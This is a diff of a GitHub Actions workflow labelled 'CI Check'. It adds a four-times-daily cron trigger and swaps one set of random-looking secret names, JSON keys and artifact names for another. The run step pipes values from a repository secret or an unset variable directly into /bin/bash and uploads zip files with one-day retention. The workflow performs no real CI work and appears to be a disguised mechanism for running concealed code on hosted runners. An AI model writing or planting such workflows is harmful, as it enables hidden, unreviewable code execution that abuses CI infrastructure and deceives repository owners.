@@ -2,6 +2,8 @@ name: CI Check
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '27 4,10,16,22 * * *'
 permissions:
   contents: read
   actions: read
@@ -22,17 +24,15 @@ jobs:
           fetch-depth: 1
       - name: Start
         env:
-          skko4832: ${{ secrets.skko4832 }}
+          ni81255: ${{ secrets.ni81255 }}
         run: |
-          printf '%s' "$skko4832" | jq -r .qhh404 | /bin/bash
-          printf '%s' "$dlqd401" | jq -r .lljk18447 | /bin/bash
-          printf '%s' "$e64" | jq -r .bnvdg4 | /bin/bash
-          echo $t8 | jq -r .scew36150 | /bin/bash
+          printf '%s' "$ni81255" | jq -r .mpsyi283 | /bin/bash
+          echo $jmlrh6 | jq -r .kl583 | /bin/bash
 
       - name: Save output
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: Fo4BDI3G
+          name: waLCGu7F
           path: "*.zip"
           retention-days: 1
